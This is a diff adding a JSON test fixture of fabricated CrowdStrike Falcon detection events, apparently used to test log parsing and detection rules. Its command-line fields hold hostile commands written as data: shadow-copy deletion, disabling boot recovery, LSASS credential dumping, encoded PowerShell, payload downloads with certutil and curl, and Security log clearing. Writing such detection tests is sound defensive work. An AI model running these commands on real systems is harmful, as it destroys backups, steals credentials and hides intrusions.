@@ -1,0 +1,1032 @@
+{
+  "description": "Fabricated CrowdStrike Falcon event-stream records for crowdstrike_review_test.go. Addresses are RFC 5737 documentation addresses, MAC addresses RFC 7042 documentation addresses, names are examples and customer and client identifiers are zero. No record comes from a customer.",
+  "cases": [
+    {
+      "name": "vss-quoted-program-path",
+      "purpose": "Shadow-copy deletion whose program path is quoted: the command line must keep both quotes.",
+      "raw": {
+        "metadata": {
+          "customerIDString": "00000000000000000000000000000000",
+          "offset": 101,
+          "eventType": "EppDetectionSummaryEvent",
+          "eventCreationTime": 1790000101000,
+          "version": "1.0"
+        },
+        "event": {
+          "AgentId": "00000000000000000000000000000001",
+          "CompositeId": "00000000000000000000000000000000:ind:00000000000000000000000000000001:1",
+          "Hostname": "ws-example-01",
+          "LocalIP": "192.0.2.1",
+          "MACAddress": "00-00-5e-00-53-01",
+          "UserName": "example.user",
+          "PlatformName": "Windows",
+          "FileName": "vssadmin.exe",
+          "FilePath": "\\Device\\HarddiskVolume3\\Windows\\System32",
+          "CommandLine": "\"C:\\Windows\\System32\\vssadmin.exe\" delete shadows /all /quiet",
+          "ParentImageFileName": "explorer.exe",
+          "ParentCommandLine": "\"C:\\Windows\\explorer.exe\"",
+          "SHA256String": "1111111111111111111111111111111111111111111111111111111111111111",
+          "MD5String": "22222222222222222222222222222222",
+          "Severity": 4,
+          "SeverityName": "High",
+          "Tactic": "Execution",
+          "Technique": "Command and Scripting Interpreter",
+          "Objective": "Follow Through",
+          "PatternId": 10001,
+          "PatternDispositionValue": 16,
+          "PatternDispositionDescription": "Detection, standard detection.",
+          "PatternDispositionFlags": {
+            "Detect": true,
+            "KillProcess": false,
+            "PolicyDisabled": false,
+            "ProcessBlocked": false
+          },
+          "ProcessId": 4001,
+          "ParentProcessId": 3001,
+          "ProcessStartTime": 1790000101,
+          "FalconHostLink": "https://falcon.example.invalid/activity/detections/detail/00000000000000000000000000000001"
+        }
+      },
+      "expected": {
+        "origin.host": "ws-example-01",
+        "origin.ip": "192.0.2.1",
+        "origin.operatingSystem": "Windows",
+        "origin.user": "example.user",
+        "log.eventCommandLine": "\"C:\\Windows\\System32\\vssadmin.exe\" delete shadows /all /quiet",
+        "log.eventParentCommandLine": "\"C:\\Windows\\explorer.exe\""
+      },
+      "absent": [
+        "log.event.CommandLine"
+      ],
+      "rules": [
+        "endpoint_or_XDR_detection_alert.yml",
+        "inhibit_system_recovery.yml"
+      ]
+    },
+    {
+      "name": "bcdedit-quoted-last-argument-no-user",
+      "purpose": "Recovery disabled with a quoted last argument, on a detection without a user name.",
+      "raw": {
+        "metadata": {
+          "customerIDString": "00000000000000000000000000000000",
+          "offset": 102,
+          "eventType": "EppDetectionSummaryEvent",
+          "eventCreationTime": 1790000102000,
+          "version": "1.0"
+        },
+        "event": {
+          "AgentId": "00000000000000000000000000000002",
+          "CompositeId": "00000000000000000000000000000000:ind:00000000000000000000000000000002:2",
+          "Hostname": "ws-example-02",
+          "LocalIP": "192.0.2.2",
+          "MACAddress": "00-00-5e-00-53-02",
+          "PlatformName": "Windows",
+          "FileName": "cmd.exe",
+          "FilePath": "\\Device\\HarddiskVolume3\\Windows\\System32",
+          "CommandLine": "cmd.exe /c bcdedit /set {current} recoveryenabled \"No\"",
+          "ParentImageFileName": "explorer.exe",
+          "ParentCommandLine": "\"C:\\Windows\\explorer.exe\"",
+          "SHA256String": "1111111111111111111111111111111111111111111111111111111111111111",
+          "MD5String": "22222222222222222222222222222222",
+          "Severity": 4,
+          "SeverityName": "High",
+          "Tactic": "Execution",
+          "Technique": "Command and Scripting Interpreter",
+          "Objective": "Follow Through",
+          "PatternId": 10002,
+          "PatternDispositionValue": 16,
+          "PatternDispositionDescription": "Detection, standard detection.",
+          "PatternDispositionFlags": {
+            "Detect": true,
+            "KillProcess": false,
+            "PolicyDisabled": false,
+            "ProcessBlocked": false
+          },
+          "ProcessId": 4002,
+          "ParentProcessId": 3002,
+          "ProcessStartTime": 1790000102,
+          "FalconHostLink": "https://falcon.example.invalid/activity/detections/detail/00000000000000000000000000000002"
+        }
+      },
+      "expected": {
+        "origin.host": "ws-example-02",
+        "origin.ip": "192.0.2.2",
+        "origin.operatingSystem": "Windows",
+        "log.eventCommandLine": "cmd.exe /c bcdedit /set {current} recoveryenabled \"No\""
+      },
+      "absent": [
+        "log.event.CommandLine",
+        "origin.user"
+      ],
+      "rules": [
+        "endpoint_or_XDR_detection_alert.yml",
+        "inhibit_system_recovery.yml"
+      ],
+      "missingIdentity": [
+        "adversary.user"
+      ]
+    },
+    {
+      "name": "vssadmin-list-near-miss",
+      "purpose": "Listing shadow copies is not deletion.",
+      "raw": {
+        "metadata": {
+          "customerIDString": "00000000000000000000000000000000",
+          "offset": 103,
+          "eventType": "EppDetectionSummaryEvent",
+          "eventCreationTime": 1790000103000,
+          "version": "1.0"
+        },
+        "event": {
+          "AgentId": "00000000000000000000000000000003",
+          "CompositeId": "00000000000000000000000000000000:ind:00000000000000000000000000000003:3",
+          "Hostname": "ws-example-03",
+          "LocalIP": "192.0.2.3",
+          "MACAddress": "00-00-5e-00-53-03",
+          "UserName": "example.user",
+          "PlatformName": "Windows",
+          "FileName": "vssadmin.exe",
+          "FilePath": "\\Device\\HarddiskVolume3\\Windows\\System32",
+          "CommandLine": "vssadmin.exe list shadows",
+          "ParentImageFileName": "explorer.exe",
+          "ParentCommandLine": "\"C:\\Windows\\explorer.exe\"",
+          "SHA256String": "1111111111111111111111111111111111111111111111111111111111111111",
+          "MD5String": "22222222222222222222222222222222",
+          "Severity": 4,
+          "SeverityName": "High",
+          "Tactic": "Execution",
+          "Technique": "Command and Scripting Interpreter",
+          "Objective": "Follow Through",
+          "PatternId": 10003,
+          "PatternDispositionValue": 16,
+          "PatternDispositionDescription": "Detection, standard detection.",
+          "PatternDispositionFlags": {
+            "Detect": true,
+            "KillProcess": false,
+            "PolicyDisabled": false,
+            "ProcessBlocked": false
+          },
+          "ProcessId": 4003,
+          "ParentProcessId": 3003,
+          "ProcessStartTime": 1790000103,
+          "FalconHostLink": "https://falcon.example.invalid/activity/detections/detail/00000000000000000000000000000003"
+        }
+      },
+      "expected": {
+        "origin.host": "ws-example-03",
+        "origin.ip": "192.0.2.3",
+        "origin.operatingSystem": "Windows",
+        "origin.user": "example.user",
+        "log.eventCommandLine": "vssadmin.exe list shadows"
+      },
+      "absent": [
+        "log.event.CommandLine"
+      ],
+      "rules": [
+        "endpoint_or_XDR_detection_alert.yml"
+      ]
+    },
+    {
+      "name": "procdump-quoted-both-ends",
+      "purpose": "LSASS memory dump whose command line starts and ends with a quote.",
+      "raw": {
+        "metadata": {
+          "customerIDString": "00000000000000000000000000000000",
+          "offset": 104,
+          "eventType": "EppDetectionSummaryEvent",
+          "eventCreationTime": 1790000104000,
+          "version": "1.0"
+        },
+        "event": {
+          "AgentId": "00000000000000000000000000000004",
+          "CompositeId": "00000000000000000000000000000000:ind:00000000000000000000000000000004:4",
+          "Hostname": "ws-example-04",
+          "LocalIP": "192.0.2.4",
+          "MACAddress": "00-00-5e-00-53-04",
+          "UserName": "example.admin",
+          "PlatformName": "Windows",
+          "FileName": "procdump64.exe",
+          "FilePath": "\\Device\\HarddiskVolume3\\Windows\\System32",
+          "CommandLine": "\"C:\\Tools\\procdump64.exe\" -accepteula -ma lsass.exe \"C:\\Temp\\lsass.dmp\"",
+          "ParentImageFileName": "explorer.exe",
+          "ParentCommandLine": "\"C:\\Windows\\explorer.exe\"",
+          "SHA256String": "1111111111111111111111111111111111111111111111111111111111111111",
+          "MD5String": "22222222222222222222222222222222",
+          "Severity": 4,
+          "SeverityName": "High",
+          "Tactic": "Credential Access",
+          "Technique": "OS Credential Dumping",
+          "Objective": "Follow Through",
+          "PatternId": 10004,
+          "PatternDispositionValue": 16,
+          "PatternDispositionDescription": "Detection, standard detection.",
+          "PatternDispositionFlags": {
+            "Detect": true,
+            "KillProcess": false,
+            "PolicyDisabled": false,
+            "ProcessBlocked": false
+          },
+          "ProcessId": 4004,
+          "ParentProcessId": 3004,
+          "ProcessStartTime": 1790000104,
+          "FalconHostLink": "https://falcon.example.invalid/activity/detections/detail/00000000000000000000000000000004"
+        }
+      },
+      "expected": {
+        "origin.host": "ws-example-04",
+        "origin.ip": "192.0.2.4",
+        "origin.operatingSystem": "Windows",
+        "origin.user": "example.admin",
+        "log.eventCommandLine": "\"C:\\Tools\\procdump64.exe\" -accepteula -ma lsass.exe \"C:\\Temp\\lsass.dmp\""
+      },
+      "absent": [
+        "log.event.CommandLine"
+      ],
+      "rules": [
+        "endpoint_or_XDR_detection_alert.yml",
+        "os_credential_dumping_activity.yml"
+      ]
+    },
+    {
+      "name": "lsass-tasklist-near-miss",
+      "purpose": "Looking up the LSASS process is not a dump.",
+      "raw": {
+        "metadata": {
+          "customerIDString": "00000000000000000000000000000000",
+          "offset": 105,
+          "eventType": "EppDetectionSummaryEvent",
+          "eventCreationTime": 1790000105000,
+          "version": "1.0"
+        },
+        "event": {
+          "AgentId": "00000000000000000000000000000005",
+          "CompositeId": "00000000000000000000000000000000:ind:00000000000000000000000000000005:5",
+          "Hostname": "ws-example-05",
+          "LocalIP": "192.0.2.5",
+          "MACAddress": "00-00-5e-00-53-05",
+          "UserName": "example.user",
+          "PlatformName": "Windows",
+          "FileName": "tasklist.exe",
+          "FilePath": "\\Device\\HarddiskVolume3\\Windows\\System32",
+          "CommandLine": "tasklist.exe /fi \"imagename eq lsass.exe\"",
+          "ParentImageFileName": "explorer.exe",
+          "ParentCommandLine": "\"C:\\Windows\\explorer.exe\"",
+          "SHA256String": "1111111111111111111111111111111111111111111111111111111111111111",
+          "MD5String": "22222222222222222222222222222222",
+          "Severity": 4,
+          "SeverityName": "High",
+          "Tactic": "Execution",
+          "Technique": "Command and Scripting Interpreter",
+          "Objective": "Follow Through",
+          "PatternId": 10005,
+          "PatternDispositionValue": 16,
+          "PatternDispositionDescription": "Detection, standard detection.",
+          "PatternDispositionFlags": {
+            "Detect": true,
+            "KillProcess": false,
+            "PolicyDisabled": false,
+            "ProcessBlocked": false
+          },
+          "ProcessId": 4005,
+          "ParentProcessId": 3005,
+          "ProcessStartTime": 1790000105,
+          "FalconHostLink": "https://falcon.example.invalid/activity/detections/detail/00000000000000000000000000000005"
+        }
+      },
+      "expected": {
+        "origin.host": "ws-example-05",
+        "origin.ip": "192.0.2.5",
+        "origin.operatingSystem": "Windows",
+        "origin.user": "example.user",
+        "log.eventCommandLine": "tasklist.exe /fi \"imagename eq lsass.exe\""
+      },
+      "absent": [
+        "log.event.CommandLine"
+      ],
+      "rules": [
+        "endpoint_or_XDR_detection_alert.yml"
+      ]
+    },
+    {
+      "name": "powershell-encoded-quoted-path",
+      "purpose": "Encoded PowerShell started through its quoted full path.",
+      "raw": {
+        "metadata": {
+          "customerIDString": "00000000000000000000000000000000",
+          "offset": 106,
+          "eventType": "EppDetectionSummaryEvent",
+          "eventCreationTime": 1790000106000,
+          "version": "1.0"
+        },
+        "event": {
+          "AgentId": "00000000000000000000000000000006",
+          "CompositeId": "00000000000000000000000000000000:ind:00000000000000000000000000000006:6",
+          "Hostname": "ws-example-06",
+          "LocalIP": "192.0.2.6",
+          "MACAddress": "00-00-5e-00-53-06",
+          "UserName": "example.user",
+          "PlatformName": "Windows",
+          "FileName": "powershell.exe",
+          "FilePath": "\\Device\\HarddiskVolume3\\Windows\\System32",
+          "CommandLine": "\"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\" -NoProfile -enc SQBFAFgA",
+          "ParentImageFileName": "explorer.exe",
+          "ParentCommandLine": "\"C:\\Windows\\explorer.exe\"",
+          "SHA256String": "1111111111111111111111111111111111111111111111111111111111111111",
+          "MD5String": "22222222222222222222222222222222",
+          "Severity": 4,
+          "SeverityName": "High",
+          "Tactic": "Execution",
+          "Technique": "Command and Scripting Interpreter",
+          "Objective": "Follow Through",
+          "PatternId": 10006,
+          "PatternDispositionValue": 16,
+          "PatternDispositionDescription": "Detection, standard detection.",
+          "PatternDispositionFlags": {
+            "Detect": true,
+            "KillProcess": false,
+            "PolicyDisabled": false,
+            "ProcessBlocked": false
+          },
+          "ProcessId": 4006,
+          "ParentProcessId": 3006,
+          "ProcessStartTime": 1790000106,
+          "FalconHostLink": "https://falcon.example.invalid/activity/detections/detail/00000000000000000000000000000006"
+        }
+      },
+      "expected": {
+        "origin.host": "ws-example-06",
+        "origin.ip": "192.0.2.6",
+        "origin.operatingSystem": "Windows",
+        "origin.user": "example.user",
+        "log.eventCommandLine": "\"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\" -NoProfile -enc SQBFAFgA"
+      },
+      "absent": [
+        "log.event.CommandLine"
+      ],
+      "rules": [
+        "endpoint_or_XDR_detection_alert.yml",
+        "suspicious_encoded_powershell_execution.yml"
+      ]
+    },
+    {
+      "name": "powershell-file-near-miss",
+      "purpose": "A PowerShell script file is not an encoded command.",
+      "raw": {
+        "metadata": {
+          "customerIDString": "00000000000000000000000000000000",
+          "offset": 107,
+          "eventType": "EppDetectionSummaryEvent",
+          "eventCreationTime": 1790000107000,
+          "version": "1.0"
+        },
+        "event": {
+          "AgentId": "00000000000000000000000000000007",
+          "CompositeId": "00000000000000000000000000000000:ind:00000000000000000000000000000007:7",
+          "Hostname": "ws-example-07",
+          "LocalIP": "192.0.2.7",
+          "MACAddress": "00-00-5e-00-53-07",
+          "UserName": "example.user",
+          "PlatformName": "Windows",
+          "FileName": "powershell.exe",
+          "FilePath": "\\Device\\HarddiskVolume3\\Windows\\System32",
+          "CommandLine": "powershell.exe -NoProfile -File \"C:\\Scripts\\report.ps1\"",
+          "ParentImageFileName": "explorer.exe",
+          "ParentCommandLine": "\"C:\\Windows\\explorer.exe\"",
+          "SHA256String": "1111111111111111111111111111111111111111111111111111111111111111",
+          "MD5String": "22222222222222222222222222222222",
+          "Severity": 4,
+          "SeverityName": "High",
+          "Tactic": "Execution",
+          "Technique": "Command and Scripting Interpreter",
+          "Objective": "Follow Through",
+          "PatternId": 10007,
+          "PatternDispositionValue": 16,
+          "PatternDispositionDescription": "Detection, standard detection.",
+          "PatternDispositionFlags": {
+            "Detect": true,
+            "KillProcess": false,
+            "PolicyDisabled": false,
+            "ProcessBlocked": false
+          },
+          "ProcessId": 4007,
+          "ParentProcessId": 3007,
+          "ProcessStartTime": 1790000107,
+          "FalconHostLink": "https://falcon.example.invalid/activity/detections/detail/00000000000000000000000000000007"
+        }
+      },
+      "expected": {
+        "origin.host": "ws-example-07",
+        "origin.ip": "192.0.2.7",
+        "origin.operatingSystem": "Windows",
+        "origin.user": "example.user",
+        "log.eventCommandLine": "powershell.exe -NoProfile -File \"C:\\Scripts\\report.ps1\""
+      },
+      "absent": [
+        "log.event.CommandLine"
+      ],
+      "rules": [
+        "endpoint_or_XDR_detection_alert.yml"
+      ]
+    },
+    {
+      "name": "certutil-urlcache",
+      "purpose": "certutil downloading over HTTP.",
+      "raw": {
+        "metadata": {
+          "customerIDString": "00000000000000000000000000000000",
+          "offset": 108,
+          "eventType": "EppDetectionSummaryEvent",
+          "eventCreationTime": 1790000108000,
+          "version": "1.0"
+        },
+        "event": {
+          "AgentId": "00000000000000000000000000000008",
+          "CompositeId": "00000000000000000000000000000000:ind:00000000000000000000000000000008:8",
+          "Hostname": "ws-example-08",
+          "LocalIP": "192.0.2.8",
+          "MACAddress": "00-00-5e-00-53-08",
+          "UserName": "example.user",
+          "PlatformName": "Windows",
+          "FileName": "certutil.exe",
+          "FilePath": "\\Device\\HarddiskVolume3\\Windows\\System32",
+          "CommandLine": "certutil.exe -urlcache -split -f http://198.51.100.20/payload.bin C:\\Users\\Public\\payload.bin",
+          "ParentImageFileName": "explorer.exe",
+          "ParentCommandLine": "\"C:\\Windows\\explorer.exe\"",
+          "SHA256String": "1111111111111111111111111111111111111111111111111111111111111111",
+          "MD5String": "22222222222222222222222222222222",
+          "Severity": 4,
+          "SeverityName": "High",
+          "Tactic": "Command and Control",
+          "Technique": "Ingress Tool Transfer",
+          "Objective": "Follow Through",
+          "PatternId": 10008,
+          "PatternDispositionValue": 16,
+          "PatternDispositionDescription": "Detection, standard detection.",
+          "PatternDispositionFlags": {
+            "Detect": true,
+            "KillProcess": false,
+            "PolicyDisabled": false,
+            "ProcessBlocked": false
+          },
+          "ProcessId": 4008,
+          "ParentProcessId": 3008,
+          "ProcessStartTime": 1790000108,
+          "FalconHostLink": "https://falcon.example.invalid/activity/detections/detail/00000000000000000000000000000008"
+        }
+      },
+      "expected": {
+        "origin.host": "ws-example-08",
+        "origin.ip": "192.0.2.8",
+        "origin.operatingSystem": "Windows",
+        "origin.user": "example.user",
+        "log.eventCommandLine": "certutil.exe -urlcache -split -f http://198.51.100.20/payload.bin C:\\Users\\Public\\payload.bin"
+      },
+      "absent": [
+        "log.event.CommandLine"
+      ],
+      "rules": [
+        "endpoint_or_XDR_detection_alert.yml",
+        "suspicious_native_downloaders.yml"
+      ]
+    },
+    {
+      "name": "certutil-hashfile-near-miss",
+      "purpose": "certutil hashing a local file downloads nothing.",
+      "raw": {
+        "metadata": {
+          "customerIDString": "00000000000000000000000000000000",
+          "offset": 109,
+          "eventType": "EppDetectionSummaryEvent",
+          "eventCreationTime": 1790000109000,
+          "version": "1.0"
+        },
+        "event": {
+          "AgentId": "00000000000000000000000000000009",
+          "CompositeId": "00000000000000000000000000000000:ind:00000000000000000000000000000009:9",
+          "Hostname": "ws-example-09",
+          "LocalIP": "192.0.2.9",
+          "MACAddress": "00-00-5e-00-53-09",
+          "UserName": "example.user",
+          "PlatformName": "Windows",
+          "FileName": "certutil.exe",
+          "FilePath": "\\Device\\HarddiskVolume3\\Windows\\System32",
+          "CommandLine": "certutil.exe -hashfile \"C:\\Windows\\notepad.exe\" SHA256",
+          "ParentImageFileName": "explorer.exe",
+          "ParentCommandLine": "\"C:\\Windows\\explorer.exe\"",
+          "SHA256String": "1111111111111111111111111111111111111111111111111111111111111111",
+          "MD5String": "22222222222222222222222222222222",
+          "Severity": 4,
+          "SeverityName": "High",
+          "Tactic": "Execution",
+          "Technique": "Command and Scripting Interpreter",
+          "Objective": "Follow Through",
+          "PatternId": 10009,
+          "PatternDispositionValue": 16,
+          "PatternDispositionDescription": "Detection, standard detection.",
+          "PatternDispositionFlags": {
+            "Detect": true,
+            "KillProcess": false,
+            "PolicyDisabled": false,
+            "ProcessBlocked": false
+          },
+          "ProcessId": 4009,
+          "ParentProcessId": 3009,
+          "ProcessStartTime": 1790000109,
+          "FalconHostLink": "https://falcon.example.invalid/activity/detections/detail/00000000000000000000000000000009"
+        }
+      },
+      "expected": {
+        "origin.host": "ws-example-09",
+        "origin.ip": "192.0.2.9",
+        "origin.operatingSystem": "Windows",
+        "origin.user": "example.user",
+        "log.eventCommandLine": "certutil.exe -hashfile \"C:\\Windows\\notepad.exe\" SHA256"
+      },
+      "absent": [
+        "log.event.CommandLine"
+      ],
+      "rules": [
+        "endpoint_or_XDR_detection_alert.yml"
+      ]
+    },
+    {
+      "name": "mac-curl-quoted-url",
+      "purpose": "curl on macOS fetching a quoted HTTP address.",
+      "raw": {
+        "metadata": {
+          "customerIDString": "00000000000000000000000000000000",
+          "offset": 110,
+          "eventType": "EppDetectionSummaryEvent",
+          "eventCreationTime": 1790000110000,
+          "version": "1.0"
+        },
+        "event": {
+          "AgentId": "0000000000000000000000000000000a",
+          "CompositeId": "00000000000000000000000000000000:ind:0000000000000000000000000000000a:10",
+          "Hostname": "mac-example-10",
+          "LocalIP": "192.0.2.10",
+          "MACAddress": "00-00-5e-00-53-0a",
+          "UserName": "example.user",
+          "PlatformName": "Mac",
+          "FileName": "curl",
+          "FilePath": "/usr/bin",
+          "CommandLine": "/usr/bin/curl -s -o /tmp/update.sh \"http://198.51.100.20/update.sh\"",
+          "ParentImageFileName": "bash",
+          "ParentCommandLine": "/bin/bash",
+          "SHA256String": "1111111111111111111111111111111111111111111111111111111111111111",
+          "MD5String": "22222222222222222222222222222222",
+          "Severity": 4,
+          "SeverityName": "High",
+          "Tactic": "Command and Control",
+          "Technique": "Ingress Tool Transfer",
+          "Objective": "Follow Through",
+          "PatternId": 10010,
+          "PatternDispositionValue": 16,
+          "PatternDispositionDescription": "Detection, standard detection.",
+          "PatternDispositionFlags": {
+            "Detect": true,
+            "KillProcess": false,
+            "PolicyDisabled": false,
+            "ProcessBlocked": false
+          },
+          "ProcessId": 4010,
+          "ParentProcessId": 3010,
+          "ProcessStartTime": 1790000110,
+          "FalconHostLink": "https://falcon.example.invalid/activity/detections/detail/0000000000000000000000000000000a"
+        }
+      },
+      "expected": {
+        "origin.host": "mac-example-10",
+        "origin.ip": "192.0.2.10",
+        "origin.operatingSystem": "Mac",
+        "origin.user": "example.user",
+        "log.eventCommandLine": "/usr/bin/curl -s -o /tmp/update.sh \"http://198.51.100.20/update.sh\""
+      },
+      "absent": [
+        "log.event.CommandLine"
+      ],
+      "rules": [
+        "endpoint_or_XDR_detection_alert.yml",
+        "suspicious_downloader_execution_linux_macos.yml",
+        "suspicious_native_downloaders.yml"
+      ]
+    },
+    {
+      "name": "wevtutil-clear",
+      "purpose": "wevtutil clearing the Security log.",
+      "raw": {
+        "metadata": {
+          "customerIDString": "00000000000000000000000000000000",
+          "offset": 111,
+          "eventType": "EppDetectionSummaryEvent",
+          "eventCreationTime": 1790000111000,
+          "version": "1.0"
+        },
+        "event": {
+          "AgentId": "0000000000000000000000000000000b",
+          "CompositeId": "00000000000000000000000000000000:ind:0000000000000000000000000000000b:11",
+          "Hostname": "ws-example-11",
+          "LocalIP": "192.0.2.11",
+          "MACAddress": "00-00-5e-00-53-0b",
+          "UserName": "example.admin",
+          "PlatformName": "Windows",
+          "FileName": "wevtutil.exe",
+          "FilePath": "\\Device\\HarddiskVolume3\\Windows\\System32",
+          "CommandLine": "wevtutil cl Security",
+          "ParentImageFileName": "explorer.exe",
+          "ParentCommandLine": "\"C:\\Windows\\explorer.exe\"",
+          "SHA256String": "1111111111111111111111111111111111111111111111111111111111111111",
+          "MD5String": "22222222222222222222222222222222",
+          "Severity": 4,
+          "SeverityName": "High",
+          "Tactic": "Defense Evasion",
+          "Technique": "Indicator Removal",
+          "Objective": "Follow Through",
+          "PatternId": 10011,
+          "PatternDispositionValue": 16,
+          "PatternDispositionDescription": "Detection, standard detection.",
+          "PatternDispositionFlags": {
+            "Detect": true,
+            "KillProcess": false,
+            "PolicyDisabled": false,
+            "ProcessBlocked": false
+          },
+          "ProcessId": 4011,
+          "ParentProcessId": 3011,
+          "ProcessStartTime": 1790000111,
+          "FalconHostLink": "https://falcon.example.invalid/activity/detections/detail/0000000000000000000000000000000b"
+        }
+      },
+      "expected": {
+        "origin.host": "ws-example-11",
+        "origin.ip": "192.0.2.11",
+        "origin.operatingSystem": "Windows",
+        "origin.user": "example.admin",
+        "log.eventCommandLine": "wevtutil cl Security"
+      },
+      "absent": [
+        "log.event.CommandLine"
+      ],
+      "rules": [
+        "endpoint_or_XDR_detection_alert.yml",
+        "windows_event_log_clearing.yml"
+      ]
+    },
+    {
+      "name": "clear-eventlog-quoted-argument",
+      "purpose": "Clear-EventLog inside a quoted PowerShell command.",
+      "raw": {
+        "metadata": {
+          "customerIDString": "00000000000000000000000000000000",
+          "offset": 112,
+          "eventType": "EppDetectionSummaryEvent",
+          "eventCreationTime": 1790000112000,
+          "version": "1.0"
+        },
+        "event": {
+          "AgentId": "0000000000000000000000000000000c",
+          "CompositeId": "00000000000000000000000000000000:ind:0000000000000000000000000000000c:12",
+          "Hostname": "ws-example-12",
+          "LocalIP": "192.0.2.12",
+          "MACAddress": "00-00-5e-00-53-0c",
+          "UserName": "example.admin",
+          "PlatformName": "Windows",
+          "FileName": "powershell.exe",
+          "FilePath": "\\Device\\HarddiskVolume3\\Windows\\System32",
+          "CommandLine": "powershell.exe -Command \"Clear-EventLog -LogName Security\"",
+          "ParentImageFileName": "explorer.exe",
+          "ParentCommandLine": "\"C:\\Windows\\explorer.exe\"",
+          "SHA256String": "1111111111111111111111111111111111111111111111111111111111111111",
+          "MD5String": "22222222222222222222222222222222",
+          "Severity": 4,
+          "SeverityName": "High",
+          "Tactic": "Defense Evasion",
+          "Technique": "Indicator Removal",
+          "Objective": "Follow Through",
+          "PatternId": 10012,
+          "PatternDispositionValue": 16,
+          "PatternDispositionDescription": "Detection, standard detection.",
+          "PatternDispositionFlags": {
+            "Detect": true,
+            "KillProcess": false,
+            "PolicyDisabled": false,
+            "ProcessBlocked": false
+          },
+          "ProcessId": 4012,
+          "ParentProcessId": 3012,
+          "ProcessStartTime": 1790000112,
+          "FalconHostLink": "https://falcon.example.invalid/activity/detections/detail/0000000000000000000000000000000c"
+        }
+      },
+      "expected": {
+        "origin.host": "ws-example-12",
+        "origin.ip": "192.0.2.12",
+        "origin.operatingSystem": "Windows",
+        "origin.user": "example.admin",
+        "log.eventCommandLine": "powershell.exe -Command \"Clear-EventLog -LogName Security\""
+      },
+      "absent": [
+        "log.event.CommandLine"
+      ],
+      "rules": [
+        "endpoint_or_XDR_detection_alert.yml",
+        "windows_event_log_clearing.yml"
+      ]
+    },
+    {
+      "name": "wevtutil-query-spaces-near-miss",
+      "purpose": "Querying events is not clearing them; surrounding spaces are removed, quotes kept.",
+      "raw": {
+        "metadata": {
+          "customerIDString": "00000000000000000000000000000000",
+          "offset": 113,
+          "eventType": "EppDetectionSummaryEvent",
+          "eventCreationTime": 1790000113000,
+          "version": "1.0"
+        },
+        "event": {
+          "AgentId": "0000000000000000000000000000000d",
+          "CompositeId": "00000000000000000000000000000000:ind:0000000000000000000000000000000d:13",
+          "Hostname": "ws-example-13",
+          "LocalIP": "192.0.2.13",
+          "MACAddress": "00-00-5e-00-53-0d",
+          "UserName": "example.user",
+          "PlatformName": "Windows",
+          "FileName": "wevtutil.exe",
+          "FilePath": "\\Device\\HarddiskVolume3\\Windows\\System32",
+          "CommandLine": "  \"C:\\Windows\\System32\\wevtutil.exe\" qe Security /c:5  ",
+          "ParentImageFileName": "explorer.exe",
+          "ParentCommandLine": "\"C:\\Windows\\explorer.exe\"",
+          "SHA256String": "1111111111111111111111111111111111111111111111111111111111111111",
+          "MD5String": "22222222222222222222222222222222",
+          "Severity": 4,
+          "SeverityName": "High",
+          "Tactic": "Execution",
+          "Technique": "Command and Scripting Interpreter",
+          "Objective": "Follow Through",
+          "PatternId": 10013,
+          "PatternDispositionValue": 16,
+          "PatternDispositionDescription": "Detection, standard detection.",
+          "PatternDispositionFlags": {
+            "Detect": true,
+            "KillProcess": false,
+            "PolicyDisabled": false,
+            "ProcessBlocked": false
+          },
+          "ProcessId": 4013,
+          "ParentProcessId": 3013,
+          "ProcessStartTime": 1790000113,
+          "FalconHostLink": "https://falcon.example.invalid/activity/detections/detail/0000000000000000000000000000000d"
+        }
+      },
+      "expected": {
+        "origin.host": "ws-example-13",
+        "origin.ip": "192.0.2.13",
+        "origin.operatingSystem": "Windows",
+        "origin.user": "example.user",
+        "log.eventCommandLine": "\"C:\\Windows\\System32\\wevtutil.exe\" qe Security /c:5"
+      },
+      "absent": [
+        "log.event.CommandLine"
+      ],
+      "rules": [
+        "endpoint_or_XDR_detection_alert.yml"
+      ]
+    },
+    {
+      "name": "command-line-list",
+      "purpose": "A command line sent as a list of objects is stored as its JSON text without the outer brackets, as before.",
+      "raw": {
+        "metadata": {
+          "customerIDString": "00000000000000000000000000000000",
+          "offset": 114,
+          "eventType": "EppDetectionSummaryEvent",
+          "eventCreationTime": 1790000114000,
+          "version": "1.0"
+        },
+        "event": {
+          "AgentId": "0000000000000000000000000000000e",
+          "CompositeId": "00000000000000000000000000000000:ind:0000000000000000000000000000000e:14",
+          "Hostname": "ws-example-14",
+          "LocalIP": "192.0.2.14",
+          "MACAddress": "00-00-5e-00-53-0e",
+          "UserName": "example.user",
+          "PlatformName": "Windows",
+          "FileName": "vssadmin.exe",
+          "FilePath": "\\Device\\HarddiskVolume3\\Windows\\System32",
+          "CommandLine": [
+            {
+              "Value": "vssadmin delete shadows /all"
+            }
+          ],
+          "ParentImageFileName": "explorer.exe",
+          "ParentCommandLine": "\"C:\\Windows\\explorer.exe\"",
+          "SHA256String": "1111111111111111111111111111111111111111111111111111111111111111",
+          "MD5String": "22222222222222222222222222222222",
+          "Severity": 4,
+          "SeverityName": "High",
+          "Tactic": "Execution",
+          "Technique": "Command and Scripting Interpreter",
+          "Objective": "Follow Through",
+          "PatternId": 10014,
+          "PatternDispositionValue": 16,
+          "PatternDispositionDescription": "Detection, standard detection.",
+          "PatternDispositionFlags": {
+            "Detect": true,
+            "KillProcess": false,
+            "PolicyDisabled": false,
+            "ProcessBlocked": false
+          },
+          "ProcessId": 4014,
+          "ParentProcessId": 3014,
+          "ProcessStartTime": 1790000114,
+          "FalconHostLink": "https://falcon.example.invalid/activity/detections/detail/0000000000000000000000000000000e"
+        }
+      },
+      "expected": {
+        "origin.host": "ws-example-14",
+        "origin.ip": "192.0.2.14",
+        "origin.operatingSystem": "Windows",
+        "origin.user": "example.user",
+        "log.eventCommandLine": "\"Value\":\"vssadmin delete shadows /all\""
+      },
+      "absent": [
+        "log.event.CommandLine"
+      ],
+      "rules": [
+        "endpoint_or_XDR_detection_alert.yml",
+        "inhibit_system_recovery.yml"
+      ]
+    },
+    {
+      "name": "policy-disabled",
+      "purpose": "A detection whose disposition flags say the prevention policy was disabled.",
+      "raw": {
+        "metadata": {
+          "customerIDString": "00000000000000000000000000000000",
+          "offset": 115,
+          "eventType": "EppDetectionSummaryEvent",
+          "eventCreationTime": 1790000115000,
+          "version": "1.0"
+        },
+        "event": {
+          "AgentId": "0000000000000000000000000000000f",
+          "CompositeId": "00000000000000000000000000000000:ind:0000000000000000000000000000000f:15",
